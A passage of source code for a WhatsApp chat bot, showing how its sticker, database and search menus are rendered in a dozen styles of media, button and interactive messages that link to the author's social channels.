                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'stickermenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${stickermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'databasemenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${databasemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'searchmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${searchmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
